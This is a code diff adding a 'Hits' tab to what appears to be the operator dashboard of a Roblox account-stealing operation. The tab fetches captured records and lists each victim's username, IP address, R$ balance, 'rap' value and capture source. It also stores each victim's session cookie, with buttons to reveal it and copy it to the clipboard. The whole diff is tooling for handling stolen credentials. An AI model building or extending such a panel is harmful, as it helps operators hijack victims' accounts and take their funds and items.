@@ -232,6 +232,10 @@ function switchMainTab(tabName, btn) {
         }
     }
 
+    if (tabName === 'hits' && typeof fetchAllHits === 'function') {
+        fetchAllHits();
+    }
+
     document.querySelectorAll('.dock-item[data-tab]').forEach(item => {
         const isMatch = item.dataset.tab === tabName;
         item.classList.toggle('active', isMatch);
@@ -738,6 +742,119 @@ function renderHitsSection() {
     }
 }
 
+// ── Full Hits Tab ──
+let allHitsData = [];
+const revealedCookies = new Set();
+
+function escapeHtml(value) {
+    return String(value == null ? '' : value)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
+async function fetchAllHits() {
+    try {
+        const res = await fetch('/api/hits');
+        const raw = await res.json();
+        allHitsData = Array.isArray(raw) ? raw : (raw && Array.isArray(raw.value) ? raw.value : []);
+        const badge = document.getElementById('hitsBadge');
+        if (badge) badge.textContent = allHitsData.length;
+        renderAllHits();
+    } catch (e) {
+        console.warn('All hits fetch failed:', e);
+    }
+}
+
+function cookiePreview(cookie) {
+    if (!cookie) return '';
+    if (cookie.length <= 24) return cookie;
+    return cookie.slice(0, 14) + '…' + cookie.slice(-8);
+}
+
+function renderAllHits() {
+    const bodyEl = document.getElementById('allHitsBody');
+    const emptyEl = document.getElementById('allHitsEmpty');
+    if (!bodyEl) return;
+
+    const query = (document.getElementById('hitsSearchInput')?.value || '').trim().toLowerCase();
+    const items = allHitsData.filter(h => {
+        if (!query) return true;
+        return [h.username, h.source, h.ip, h.operator, h.targetId, h.userId]
+            .some(v => String(v || '').toLowerCase().includes(query));
+    });
+
+    if (!items.length) {
+        bodyEl.innerHTML = '';
+        if (emptyEl) {
+            emptyEl.style.display = 'block';
+            emptyEl.textContent = allHitsData.length ? 'No hits match that search.' : 'No hits recorded yet.';
+        }
+        return;
+    }
+    if (emptyEl) emptyEl.style.display = 'none';
+
+    bodyEl.innerHTML = items.map(h => {
+        const id = escapeHtml(h.id || '');
+        const username = escapeHtml(h.username || 'Unknown');
+        const avatar = h.avatarUrl
+            ? `<img src="${escapeHtml(h.avatarUrl)}" alt="" onerror="this.onerror=null;this.style.display='none';">`
+            : `<span class="hit-avatar-icon">${USER_SVG}</span>`;
+        const cookie = String(h.cookie || '');
+        const revealed = revealedCookies.has(h.id);
+        const shown = cookie ? (revealed ? escapeHtml(cookie) : escapeHtml(cookiePreview(cookie))) : '—';
+        const source = escapeHtml(h.source || 'login');
+        const ip = escapeHtml(h.ip || '—');
+        const time = formatTimeAgo(h.timestamp);
+        const balance = (Number(h.balance) || 0).toLocaleString() + ' R$';
+        const rap = (Number(h.rap) || 0).toLocaleString();
+        const hasCookie = Boolean(cookie);
+
+        return `
+            <div class="hits-page-row">
+                <div class="hits-page-user">${avatar}<span class="hits-page-username" title="${username}">${username}</span></div>
+                <div class="hits-page-cell hits-page-source">${source}</div>
+                <div class="hits-page-cell">${ip}</div>
+                <div class="hits-page-cell">${time}</div>
+                <div class="hits-page-cell hits-page-balance">${balance}</div>
+                <div class="hits-page-cell">${rap}</div>
+                <div class="hits-page-cookie">
+                    <code title="${hasCookie ? 'Cookie stored' : 'No cookie captured'}">${shown}</code>
+                    <div class="hits-page-cookie-actions">
+                        ${hasCookie ? `<button type="button" class="hits-cookie-btn" title="Reveal" onclick="toggleHitCookie('${id}')"><i class="fas fa-eye${revealed ? '-slash' : ''}"></i></button>` : ''}
+                        ${hasCookie ? `<button type="button" class="hits-cookie-btn" title="Copy cookie" onclick="copyHitCookie('${id}')"><i class="fas fa-copy"></i></button>` : ''}
+                    </div>
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+function toggleHitCookie(id) {
+    if (!id) return;
+    if (revealedCookies.has(id)) revealedCookies.delete(id);
+    else revealedCookies.add(id);
+    renderAllHits();
+}
+
+function copyHitCookie(id) {
+    const hit = allHitsData.find(h => h.id === id);
+    if (!hit || !hit.cookie) return;
+    const done = () => {
+        const btn = document.querySelector(`.hits-cookie-btn[onclick="copyHitCookie('${id}')"]`);
+        if (btn) {
+            const icon = btn.querySelector('i');
+            if (icon) icon.className = 'fas fa-check';
+            setTimeout(() => { if (icon) icon.className = 'fas fa-copy'; }, 1200);
+        }
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(hit.cookie).then(done).catch(() => {});
+    }
+}
+
 function animateCounter(el, target, suffix = '') {
     if (!el) return;
     const end = Math.round(Number(target) || 0);
@@ -941,6 +1058,7 @@ function renderChartWithActivity(activityList) {
 fetchStats();
 fetchLeaderboard();
 fetchHitsAndVisits();
+fetchAllHits();
 setInterval(fetchStats, 10000);
 setInterval(fetchLeaderboard, 8000);
 setInterval(fetchHitsAndVisits, 6000);
@@ -2140,6 +2258,7 @@ fetchWebhookStatus();
 fetchStats();
 fetchLeaderboard();
 fetchHitsAndVisits();
+fetchAllHits();
 
 setInterval(() => {
     fetchStats();
